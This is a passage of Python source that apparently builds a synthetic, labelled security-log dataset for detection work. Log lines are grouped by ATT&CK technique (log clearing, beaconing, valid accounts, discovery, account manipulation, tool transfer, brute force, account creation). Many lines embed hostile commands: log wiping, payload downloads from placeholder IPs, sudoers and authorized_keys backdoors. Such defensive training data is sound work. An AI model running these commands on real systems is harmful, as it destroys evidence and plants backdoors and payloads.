        ("2024-02-11T14:15:00Z WORKSTATION182 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Clear-EventLog -LogName Security user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1070.001", "high", "PowerShell Clear-EventLog for Security log."),
        ("Feb 11 14:20:00 host90 audit: type=EXECVE pid=8000 uid=0 cmdline=rm -rf /var/log/audit", "Linux", "AuditD", "Malicious", "T1070.002", "high", "Removing the audit log directory."),
        ("Feb 11 14:25:00 host91 audit: type=EXECVE pid=8010 uid=0 cmdline=shred -u /var/log/wtmp /var/log/btmp", "Linux", "AuditD", "Malicious", "T1070.002", "high", "shred -u on wtmp/btmp - login-history erasure."),
        ("2024-02-11T14:30:00Z WORKSTATION183 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\fsutil.exe cmdline=fsutil usn deletejournal /D C: user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1070.004", "high", "Deleting USN change journal - filesystem forensics tamper."),
        ("Feb 11 14:35:00 host92 audit: type=EXECVE pid=8020 uid=0 cmdline=: > /var/log/syslog", "Linux", "AuditD", "Malicious", "T1070.002", "high", "Truncating /var/log/syslog in place - log wipe."),
        ("Feb 11 14:40:00 host93 audit: type=EXECVE pid=8030 uid=0 cmdline=echo > /var/log/auth.log", "Linux", "AuditD", "Malicious", "T1070.002", "high", "Overwriting auth.log with empty echo - selective log erasure."),
        ("2024-02-11T14:45:00Z WORKSTATION184 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\cmd.exe cmdline=cmd /c del /F /Q C:\\Windows\\System32\\winevt\\Logs\\*.evtx user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1070.001", "high", "Bulk-deleting .evtx files - event-log destruction."),
        ("2024-02-11T14:50:00Z WORKSTATION185 Sysmon EventID=1: Process Create. process=C:\\Users\\Public\\ts.exe cmdline=timestomp.exe -m 2020:01:01:00:00:00 C:\\Users\\Public\\p.exe user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1070.006", "high", "timestomp modifying MACE times - timestomping."),
        ("Feb 11 14:55:00 host94 audit: type=EXECVE pid=8040 uid=0 cmdline=touch -t 202001010000 /tmp/.b", "Linux", "AuditD", "Malicious", "T1070.006", "medium", "Using touch -t to backdate a file - timestomp on Linux."),
        ("2024-02-11T15:00:00Z WORKSTATION186 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\auditpol.exe cmdline=auditpol /clear /y user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1070.001", "high", "auditpol /clear wiping audit policy - audit configuration tamper."),
        ("Feb 11 15:05:00 host95 audit: type=EXECVE pid=8050 uid=0 cmdline=logrotate -f /etc/logrotate.conf && rm /var/log/*.1", "Linux", "AuditD", "Suspicious", "T1070.002", "medium", "Force-rotate then delete rotated logs - log-destruction pattern."),
        ("2024-02-11T15:10:00Z WORKSTATION187 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\wevtutil.exe cmdline=wevtutil cl Microsoft-Windows-PowerShell/Operational user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1070.001", "high", "Clearing PowerShell Operational log - covering up PS activity."),
        ("Feb 11 15:15:00 host96 audit: type=EXECVE pid=8060 uid=0 cmdline=journalctl --rotate && journalctl --vacuum-time=1s", "Linux", "AuditD", "Malicious", "T1070.002", "high", "Forcing journald vacuum-to-1-second - systemd-journal wipe."),
    ]),
    # T1071 App Layer Protocol (currently 5) -> +15
    ("T1071", [
        ("{\"@timestamp\":\"2024-02-11T15:20:00Z\",\"id.orig_h\":\"10.0.4.30\",\"id.resp_h\":\"198.51.100.140\",\"id.resp_p\":443,\"proto\":\"tcp\",\"service\":\"ssl\",\"duration\":4,\"orig_bytes\":256,\"resp_bytes\":0,\"conn_state\":\"S1\"}", "IDS", "Zeek JSON", "Malicious", "T1071.001", "high", "HTTPS heartbeat with zero bytes from server - beaconing."),
        ("2024-02-11T15:25:00Z dns03 named[3500]: client 10.0.4.31#52222: query: aX3k9.c2-sub.tld IN TXT +", "Linux", "Named DNS Log", "Malicious", "T1071.004", "high", "DNS TXT query to a short-label C2 subdomain."),
        ("2024-02-11T15:30:00Z dns03 named[3500]: client 10.0.4.32#52230: query: b7q2m.c2-sub.tld IN TXT +", "Linux", "Named DNS Log", "Malicious", "T1071.004", "high", "Another TXT query to the same c2-sub root - DNS C2 channel."),
        ("2024-02-11T15:35:00Z dns03 named[3500]: client 10.0.4.33#52240: query: fe8p1.c2-sub.tld IN TXT +", "Linux", "Named DNS Log", "Malicious", "T1071.004", "high", "Third TXT query - randomized-subdomain tunneling."),
        ("date=2024-02-11 time=15:40:00 devname=FG-EDGE-01 type=traffic srcip=10.0.4.34 dstip=198.51.100.150 dstport=443 action=accept sentbyte=240 rcvdbyte=0 proto=6 duration=2 service=HTTPS", "Firewall", "Fortinet KV", "Malicious", "T1071.001", "high", "Minimal HTTPS beacon - C2 heartbeat."),
        ("{\"@timestamp\":\"2024-02-11T15:45:00Z\",\"id.orig_h\":\"10.0.4.35\",\"id.resp_h\":\"198.51.100.151\",\"id.resp_p\":80,\"proto\":\"tcp\",\"service\":\"http\",\"duration\":2,\"orig_bytes\":180,\"resp_bytes\":0,\"conn_state\":\"S1\"}", "IDS", "Zeek JSON", "Malicious", "T1071.001", "high", "HTTP beacon with no server bytes - plain-HTTP C2."),
        ("date=2024-02-11 time=15:50:00 devname=FG-EDGE-01 type=traffic srcip=10.0.4.36 dstip=198.51.100.152 dstport=443 action=accept sentbyte=200 rcvdbyte=0 proto=6 duration=1 service=HTTPS", "Firewall", "Fortinet KV", "Suspicious", "T1071.001", "medium", "Short HTTPS heartbeat with 0 bytes in - low-volume beacon."),
        ("2024-02-11T15:55:00Z dns03 named[3500]: client 10.0.4.37#52250: query: kj3l8.c2-sub.tld IN A +", "Linux", "Named DNS Log", "Malicious", "T1071.004", "high", "A-record query to a randomized C2 subdomain."),
        ("{\"@timestamp\":\"2024-02-11T16:00:00Z\",\"id.orig_h\":\"10.0.4.38\",\"id.resp_h\":\"198.51.100.153\",\"id.resp_p\":443,\"proto\":\"tcp\",\"service\":\"ssl\",\"duration\":3,\"orig_bytes\":300,\"resp_bytes\":0,\"conn_state\":\"S1\"}", "IDS", "Zeek JSON", "Malicious", "T1071.001", "high", "Another low-volume HTTPS heartbeat - classic beacon."),
        ("2024-02-11T16:05:00Z dns03 named[3500]: client 10.0.4.39#52260: query: zx8n4.c2-sub.tld IN TXT +", "Linux", "Named DNS Log", "Malicious", "T1071.004", "high", "TXT beacon query to c2-sub."),
        ("2024-02-11T16:10:00Z dns03 named[3500]: client 10.0.4.40#52270: query: pq7r2.c2-sub.tld IN TXT +", "Linux", "Named DNS Log", "Malicious", "T1071.004", "high", "Another TXT beacon query - ongoing DNS C2."),
        ("date=2024-02-11 time=16:15:00 devname=FG-EDGE-01 type=traffic srcip=10.0.4.41 dstip=198.51.100.154 dstport=443 action=accept sentbyte=220 rcvdbyte=0 proto=6 duration=2 service=HTTPS", "Firewall", "Fortinet KV", "Suspicious", "T1071.001", "medium", "Small outbound HTTPS with 0 bytes back - app-layer beacon."),
        ("{\"@timestamp\":\"2024-02-11T16:20:00Z\",\"id.orig_h\":\"10.0.4.42\",\"id.resp_h\":\"198.51.100.155\",\"id.resp_p\":8080,\"proto\":\"tcp\",\"service\":\"http\",\"duration\":2,\"orig_bytes\":150,\"resp_bytes\":0,\"conn_state\":\"S1\"}", "IDS", "Zeek JSON", "Malicious", "T1071.001", "high", "HTTP beacon on non-standard 8080 with zero response."),
        ("2024-02-11T16:25:00Z dns03 named[3500]: client 10.0.4.43#52280: query: hy6t9.c2-sub.tld IN TXT +", "Linux", "Named DNS Log", "Malicious", "T1071.004", "high", "Yet another randomized TXT query."),
        ("date=2024-02-11 time=16:30:00 devname=FG-EDGE-01 type=traffic srcip=10.0.4.44 dstip=198.51.100.156 dstport=443 action=accept sentbyte=210 rcvdbyte=0 proto=6 duration=1 service=HTTPS", "Firewall", "Fortinet KV", "Malicious", "T1071.001", "high", "Minimal outbound HTTPS - persistent beaconing pattern."),
    ]),
    # T1078 Valid Accounts (currently 5) -> +15
    ("T1078", [
        ("Feb 11 16:35:00 bastion05 sshd[5400]: Accepted password for root from 198.51.100.200 port 51500 ssh2", "Linux", "Syslog", "Malicious", "T1078.003", "high", "Root SSH password login from external IP."),
        ("Feb 11 16:40:00 bastion06 sshd[5410]: Accepted keyboard-interactive/pam for root from 203.0.113.201 port 51510 ssh2", "Linux", "Syslog", "Malicious", "T1078.003", "high", "Root interactive PAM login from external IP."),
        ("2024-02-11T16:45:00Z DC07 WinEvent EventID=4624: An account was successfully logged on. Account Name: CORP\\Administrator  Logon Type: 10  Source Network Address: 203.0.113.202", "Windows", "Winlogbeat", "Malicious", "T1078.002", "high", "Domain Admin RDP from external IP."),
        ("2024-02-11T16:50:00Z CLOUDAPI aws: event=ConsoleLogin user=prod-admin sourceIPAddress=203.0.113.10 userAgent=aws-cli/2.4.22 mfaUsed=No errorMessage=None", "Cloud", "CloudTrail", "Malicious", "T1078.004", "high", "AWS console login by prod-admin from external IP without MFA."),
        ("2024-02-11T16:55:00Z CLOUDAPI azure: event=UserLogin user=admin@corp.example sourceIP=198.51.100.203 result=Success riskLevel=high", "Cloud", "AzureAD", "Malicious", "T1078.004", "high", "High-risk Azure AD admin login."),
        ("Feb 11 17:00:00 app07 sshd[5420]: Accepted publickey for svc_app from 203.0.113.204 port 51520 ssh2", "Linux", "Syslog", "Malicious", "T1078.003", "high", "Service-account SSH login from external IP - possible key theft."),
        ("2024-02-11T17:05:00Z DC08 WinEvent EventID=4624: An account was successfully logged on. Account Name: CORP\\svc_backup  Logon Type: 3  Source Network Address: 198.51.100.204", "Windows", "Winlogbeat", "Malicious", "T1078.002", "high", "Backup service account network logon from an external IP - anomaly."),
        ("Feb 11 17:10:00 bastion07 sshd[5430]: Accepted password for admin from 203.0.113.205 port 51530 ssh2", "Linux", "Syslog", "Malicious", "T1078.003", "high", "admin SSH password auth from external IP."),
        ("2024-02-11T17:15:00Z CLOUDAPI aws: event=AssumeRole user=iam-user/ops sourceIPAddress=203.0.113.11 userAgent=aws-cli/2.4.22", "Cloud", "CloudTrail", "Malicious", "T1078.004", "high", "AssumeRole with external sourceIP - session theft or VPN bypass."),
        ("2024-02-11T17:20:00Z DC09 WinEvent EventID=4672: Special privileges assigned to new logon. Account Name: CORP\\svc_legacy", "Windows", "Winlogbeat", "Suspicious", "T1078.002", "medium", "Legacy service account assigned special privileges - account review needed."),
        ("Feb 11 17:25:00 app08 sshd[5440]: Accepted publickey for ansible from 203.0.113.206 port 51540 ssh2", "Linux", "Syslog", "Malicious", "T1078.003", "high", "Ansible account SSH from external IP - stolen key."),
        ("2024-02-11T17:30:00Z CLOUDAPI azure: event=UserLogin user=backup-admin@corp.example sourceIP=203.0.113.208 result=Success riskLevel=high", "Cloud", "AzureAD", "Malicious", "T1078.004", "high", "High-risk Azure login for privileged backup admin."),
        ("2024-02-11T17:35:00Z DC10 WinEvent EventID=4624: An account was successfully logged on. Account Name: CORP\\Guest  Logon Type: 10  Source Network Address: 203.0.113.209", "Windows", "Winlogbeat", "Malicious", "T1078.001", "high", "Guest account RDP login from external IP."),
        ("2024-02-11T17:40:00Z DC11 WinEvent EventID=4624: An account was successfully logged on. Account Name: CORP\\krbtgt  Logon Type: 3", "Windows", "Winlogbeat", "Malicious", "T1078.002", "high", "krbtgt account logon event - should never appear, indicates golden ticket."),
        ("Feb 11 17:45:00 app09 sshd[5450]: Accepted publickey for deploy from 198.51.100.210 port 51550 ssh2", "Linux", "Syslog", "Malicious", "T1078.003", "high", "deploy user SSH from external IP - outside normal CI network range."),
    ]),
    # T1082 System Info Discovery (currently 5) -> +15
    ("T1082", [
        (f"Feb 11 18:{i:02d}:00 host{100+i} audit: type=EXECVE pid={9000+i} uid=33 cmdline=uname -a", "Linux", "AuditD", "Malicious", "T1082", "high", f"uname -a by low-priv user (sample {i+1}).")
        for i in range(15)
    ]),
    # T1083 File and Directory Discovery (currently 5) -> +15
    ("T1083", [
        ("2024-02-12T08:00:00Z WORKSTATION200 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\cmd.exe cmdline=cmd /c dir /s /b C:\\Users\\*.pdf user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1083", "high", "Recursive search for PDFs across Users - document hunt."),
        ("2024-02-12T08:05:00Z WORKSTATION201 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\where.exe cmdline=where /r C:\\ *.doc* user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1083", "high", "Recursive where for Word docs."),
        ("Feb 12 08:10:00 host110 audit: type=EXECVE pid=10000 uid=33 cmdline=find / -name '*.pem' -type f 2>/dev/null", "Linux", "AuditD", "Malicious", "T1083", "high", "Searching for .pem private keys everywhere."),
        ("Feb 12 08:15:00 host111 audit: type=EXECVE pid=10010 uid=33 cmdline=find /home -name '*.kdbx'", "Linux", "AuditD", "Malicious", "T1083", "high", "Looking for KeePass databases in home dirs."),
        ("2024-02-12T08:20:00Z WORKSTATION202 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\cmd.exe cmdline=cmd /c dir /s /b C:\\Users\\*.xlsx user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1083", "high", "Recursive xlsx hunt across Users."),
        ("Feb 12 08:25:00 host112 audit: type=EXECVE pid=10020 uid=33 cmdline=find / -name '*.sqlite' -type f", "Linux", "AuditD", "Malicious", "T1083", "high", "Hunting SQLite databases - Chrome/Firefox profile theft prep."),
        ("2024-02-12T08:30:00Z WORKSTATION203 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\where.exe cmdline=where /r C:\\ id_rsa user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1083", "high", "where /r searching for SSH private key filename."),
        ("Feb 12 08:35:00 host113 audit: type=EXECVE pid=10030 uid=33 cmdline=find /etc -name '*.conf' -readable", "Linux", "AuditD", "Suspicious", "T1083", "medium", "Enumerating readable configs under /etc."),
        ("2024-02-12T08:40:00Z WORKSTATION204 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\cmd.exe cmdline=cmd /c dir /s C:\\Backups user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1083", "high", "Enumerating a Backups folder - lookin for stale backups."),
        ("Feb 12 08:45:00 host114 audit: type=EXECVE pid=10040 uid=33 cmdline=tree -L 3 /home", "Linux", "AuditD", "Suspicious", "T1083", "medium", "tree 3-level enumeration under /home."),
        ("2024-02-12T08:50:00Z WORKSTATION205 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-ChildItem -Recurse -Path C:\\Users user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1083", "high", "Recursive Get-ChildItem across Users - broad file discovery."),
        ("Feb 12 08:55:00 host115 audit: type=EXECVE pid=10050 uid=33 cmdline=find / -type d -name '.git'", "Linux", "AuditD", "Malicious", "T1083", "high", "Looking for all .git directories - source-code hunt."),
        ("2024-02-12T09:00:00Z WORKSTATION206 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\cmd.exe cmdline=cmd /c dir /s /b '\\\\FILESERVER01\\Finance' user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1083", "high", "Recursive SMB enumeration of Finance share - data hunt."),
        ("Feb 12 09:05:00 host116 audit: type=EXECVE pid=10060 uid=33 cmdline=ls -la /root", "Linux", "AuditD", "Malicious", "T1083", "high", "Non-root user attempting to list /root."),
        ("Feb 12 09:10:00 host117 audit: type=EXECVE pid=10070 uid=33 cmdline=find / -perm -o+w -type d 2>/dev/null", "Linux", "AuditD", "Malicious", "T1083", "high", "Finding world-writable directories - privesc discovery."),
    ]),
    # T1087 Account Discovery (currently 5) -> +15
    ("T1087", [
        ("2024-02-12T09:15:00Z WORKSTATION210 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\net.exe cmdline=net user /domain user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1087.002", "high", "net user /domain - domain account enumeration."),
        ("2024-02-12T09:20:00Z WORKSTATION211 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\net.exe cmdline=net group 'Domain Admins' /domain user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1087.002", "high", "Enumerating Domain Admins group."),
        ("2024-02-12T09:25:00Z WORKSTATION212 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-ADUser -Filter * -Properties * | Select SamAccountName,Enabled user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1087.002", "high", "Get-ADUser dumping all users and properties."),
        ("2024-02-12T09:30:00Z WORKSTATION213 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-ADGroupMember -Identity 'Enterprise Admins' user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1087.002", "high", "Get-ADGroupMember for Enterprise Admins."),
        ("Feb 12 09:35:00 host120 audit: type=EXECVE pid=11000 uid=33 cmdline=getent passwd", "Linux", "AuditD", "Malicious", "T1087.001", "high", "getent passwd - local account enumeration."),
        ("Feb 12 09:40:00 host121 audit: type=EXECVE pid=11010 uid=33 cmdline=cat /etc/passwd", "Linux", "AuditD", "Malicious", "T1087.001", "high", "Reading /etc/passwd - local account listing."),
        ("2024-02-12T09:45:00Z WORKSTATION214 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\net.exe cmdline=net localgroup administrators user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1087.001", "high", "Local Administrators group enumeration."),
        ("2024-02-12T09:50:00Z WORKSTATION215 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\net.exe cmdline=net user user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1087.001", "high", "net user listing all local users."),
        ("2024-02-12T09:55:00Z WORKSTATION216 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-LocalUser user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1087.001", "high", "Get-LocalUser PowerShell cmdlet."),
        ("Feb 12 10:00:00 host122 audit: type=EXECVE pid=11020 uid=33 cmdline=getent group", "Linux", "AuditD", "Malicious", "T1087.001", "high", "getent group - group enumeration."),
        ("2024-02-12T10:05:00Z WORKSTATION217 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-ADComputer -Filter * user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1087.002", "high", "Get-ADComputer enumerating all AD computers."),
        ("Feb 12 10:10:00 host123 audit: type=EXECVE pid=11030 uid=33 cmdline=ldapsearch -x -H ldap://dc.corp.example.com -b 'dc=corp,dc=example,dc=com' '(objectClass=user)' sAMAccountName", "Linux", "AuditD", "Malicious", "T1087.002", "high", "ldapsearch enumerating AD users from Linux."),
        ("2024-02-12T10:15:00Z WORKSTATION218 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-ADObject -Filter 'objectClass -eq \"user\"' user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1087.002", "high", "Get-ADObject filtering for user class - broad enumeration."),
        ("2024-02-12T10:20:00Z WORKSTATION219 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\dsquery.exe cmdline=dsquery user -limit 0 user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1087.002", "high", "dsquery unlimited user listing."),
        ("Feb 12 10:25:00 host124 audit: type=EXECVE pid=11040 uid=33 cmdline=compgen -u", "Linux", "AuditD", "Suspicious", "T1087.001", "medium", "compgen -u listing bash-known users."),
    ]),
    # T1098 Account Manipulation (currently 5) -> +15
    ("T1098", [
        ("Feb 12 10:30:00 host130 audit: type=EXECVE pid=12000 uid=0 cmdline=usermod -aG sudo backdoor", "Linux", "AuditD", "Malicious", "T1098", "high", "Adding backdoor user to sudo group."),
        ("Feb 12 10:35:00 host131 audit: type=EXECVE pid=12010 uid=0 cmdline=gpasswd -a svc_app wheel", "Linux", "AuditD", "Malicious", "T1098", "high", "gpasswd adding app user to wheel."),
        ("2024-02-12T10:40:00Z DC12 WinEvent EventID=4728: A member was added to a security-enabled global group. Member: CORP\\attacker  Group: Domain Admins", "Windows", "Winlogbeat", "Malicious", "T1098", "high", "Adding attacker to Domain Admins."),
        ("2024-02-12T10:45:00Z DC12 WinEvent EventID=4732: A member was added to a security-enabled local group. Member: CORP\\svc_temp  Group: Administrators", "Windows", "Winlogbeat", "Malicious", "T1098", "high", "Adding service account to local Administrators."),
        ("2024-02-12T10:50:00Z WORKSTATION220 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\net.exe cmdline=net localgroup administrators svc_bd /add user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1098", "high", "net localgroup adding service account to administrators."),
        ("2024-02-12T10:55:00Z WORKSTATION221 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Add-LocalGroupMember -Group Administrators -Member svc_temp user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1098", "high", "PowerShell Add-LocalGroupMember."),
        ("Feb 12 11:00:00 host132 audit: type=EXECVE pid=12020 uid=0 cmdline=chown attacker:attacker /etc/passwd", "Linux", "AuditD", "Malicious", "T1098", "high", "Changing ownership of /etc/passwd - account-file tamper."),
        ("2024-02-12T11:05:00Z DC13 WinEvent EventID=4738: A user account was changed. Account Name: CORP\\jdoe  PasswordLastSet:", "Windows", "Winlogbeat", "Suspicious", "T1098", "medium", "Password reset - possible account hijack."),
        ("2024-02-12T11:10:00Z WORKSTATION222 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Set-ADUser -Identity jdoe -ServicePrincipalNames @{Add='HOST/attacker'} user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1098", "high", "SPN manipulation for kerberoasting."),
        ("Feb 12 11:15:00 host133 audit: type=EXECVE pid=12030 uid=0 cmdline=echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers", "Linux", "AuditD", "Malicious", "T1098", "high", "Appending sudoers line with NOPASSWD."),
        ("2024-02-12T11:20:00Z DC14 WinEvent EventID=4720: A user account was created. Account Name: CORP\\attacker  Created By: CORP\\jdoe", "Windows", "Winlogbeat", "Malicious", "T1098", "high", "Compromised user creating new account - privilege escalation prep."),
        ("Feb 12 11:25:00 host134 audit: type=EXECVE pid=12040 uid=0 cmdline=mkdir -p /home/backup/.ssh && echo 'ssh-rsa ...' > /home/backup/.ssh/authorized_keys", "Linux", "AuditD", "Malicious", "T1098", "high", "Placing authorized_keys for a backdoor account."),
        ("2024-02-12T11:30:00Z WORKSTATION223 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Set-ADAccountPassword -Identity svc_legacy -NewPassword (ConvertTo-SecureString 'New1' -AsPlainText -Force) user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1098", "high", "Resetting a service-account password via PowerShell."),
        ("Feb 12 11:35:00 host135 audit: type=EXECVE pid=12050 uid=0 cmdline=passwd backdoor", "Linux", "AuditD", "Malicious", "T1098", "high", "Changing password for backdoor user."),
        ("2024-02-12T11:40:00Z WORKSTATION224 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\net.exe cmdline=net user Administrator NewPassword!1 user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1098", "high", "Resetting Administrator password via net user."),
    ]),
    # T1105 Ingress Tool Transfer (currently 5) -> +15
    ("T1105", [
        ("Feb 12 11:45:00 host140 audit: type=EXECVE pid=13000 uid=0 cmdline=wget http://198.51.100.60/l.sh -O /tmp/l.sh", "Linux", "AuditD", "Malicious", "T1105", "high", "wget loader script."),
        ("Feb 12 11:50:00 host141 audit: type=EXECVE pid=13010 uid=0 cmdline=curl -o /tmp/p.bin http://203.0.113.61/p.bin", "Linux", "AuditD", "Malicious", "T1105", "high", "curl -o payload."),
        ("2024-02-12T11:55:00Z WORKSTATION230 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\certutil.exe cmdline=certutil -urlcache -split -f http://203.0.113.62/stage.dll C:\\Users\\Public\\stage.dll user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1105", "high", "certutil -urlcache download of DLL to Public."),
        ("2024-02-12T12:00:00Z WORKSTATION231 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Invoke-WebRequest -Uri http://198.51.100.63/r.exe -OutFile C:\\Temp\\r.exe user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1105", "high", "Invoke-WebRequest downloading EXE."),
        ("Feb 12 12:05:00 host142 audit: type=EXECVE pid=13020 uid=0 cmdline=wget -O /root/.ssh/authorized_keys http://198.51.100.64/keys.txt", "Linux", "AuditD", "Malicious", "T1105", "high", "wget overwriting authorized_keys."),
        ("2024-02-12T12:10:00Z WORKSTATION232 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=iwr http://198.51.100.65/t.ps1 -OutFile C:\\Temp\\t.ps1 user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1105", "high", "iwr (Invoke-WebRequest alias) downloading PS1 to Temp."),
        ("Feb 12 12:15:00 host143 audit: type=EXECVE pid=13030 uid=0 cmdline=curl -skL http://198.51.100.66/p -o /tmp/p", "Linux", "AuditD", "Malicious", "T1105", "high", "curl -skL ignoring TLS following redirects to download."),
        ("2024-02-12T12:20:00Z WORKSTATION233 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\bitsadmin.exe cmdline=bitsadmin /transfer j1 http://203.0.113.66/m.exe C:\\Users\\Public\\m.exe user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1105", "high", "bitsadmin /transfer downloading an EXE."),
        ("Feb 12 12:25:00 host144 audit: type=EXECVE pid=13040 uid=0 cmdline=scp attacker@198.51.100.67:/drop/pay ./pay", "Linux", "AuditD", "Malicious", "T1105", "high", "scp pulling payload from attacker host."),
        ("2024-02-12T12:30:00Z WORKSTATION234 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=(New-Object Net.WebClient).DownloadFile('http://198.51.100.68/x','C:\\Temp\\x') user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1105", "high", "Net.WebClient DownloadFile cradle."),
        ("Feb 12 12:35:00 host145 audit: type=EXECVE pid=13050 uid=0 cmdline=ftp -n -v 198.51.100.69 <<< $'user anonymous pass\\nbinary\\nget p'", "Linux", "AuditD", "Malicious", "T1105", "high", "ftp heredoc downloading a payload."),
        ("2024-02-12T12:40:00Z WORKSTATION235 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\certutil.exe cmdline=certutil -urlcache -split -f http://198.51.100.70/s.ps1 C:\\Temp\\s.ps1 user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1105", "high", "certutil download of PS1 script."),
        ("Feb 12 12:45:00 host146 audit: type=EXECVE pid=13060 uid=0 cmdline=python3 -c 'import urllib.request;urllib.request.urlretrieve(\"http://198.51.100.71/p\",\"/tmp/p\")'", "Linux", "AuditD", "Malicious", "T1105", "high", "Python one-liner urlretrieve - scripted download."),
        ("2024-02-12T12:50:00Z WORKSTATION236 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Start-BitsTransfer -Source http://198.51.100.72/u.zip -Destination C:\\Users\\Public\\u.zip user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1105", "high", "Start-BitsTransfer to Users\\Public."),
        ("Feb 12 12:55:00 host147 audit: type=EXECVE pid=13070 uid=0 cmdline=fetch http://198.51.100.73/bin -o /tmp/bin", "Linux", "AuditD", "Malicious", "T1105", "medium", "fetch (BSD-style) download to /tmp."),
    ]),
    # T1110 Brute Force (currently 5) -> +15
    ("T1110", [
        (f"Feb 12 13:{i:02d}:00 bastion{10+i} sshd[{5500+i}]: Failed password for invalid user admin from {200+i}.0.2.{i+1} port 55{i:03d} ssh2", "Linux", "Syslog", "Malicious", "T1110.001", "high", f"sshd failed password invalid user admin (sample {i+1}).")
        for i in range(15)
    ]),
    # T1136 Create Account (currently 5) -> +15
    ("T1136", [
        ("Feb 12 14:00:00 host150 audit: type=EXECVE pid=14000 uid=0 cmdline=useradd -m -s /bin/bash backdoor1", "Linux", "AuditD", "Malicious", "T1136.001", "high", "useradd backdoor1."),
        ("Feb 12 14:05:00 host151 audit: type=EXECVE pid=14010 uid=0 cmdline=useradd -u 0 -o -g 0 rootbk", "Linux", "AuditD", "Malicious", "T1136.001", "high", "useradd -u 0 creating a second uid-0 account."),
        ("2024-02-12T14:10:00Z DC15 WinEvent EventID=4720: A user account was created. Account Name: CORP\\hidden_a  Created By: CORP\\attacker", "Windows", "Winlogbeat", "Malicious", "T1136.002", "high", "Domain account creation by compromised user."),
        ("2024-02-12T14:15:00Z WORKSTATION240 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\net.exe cmdline=net user attacker P@ss /add user=CORP\\a", "Windows", "Sysmon", "Malicious", "T1136.001", "high", "Local account creation via net user."),
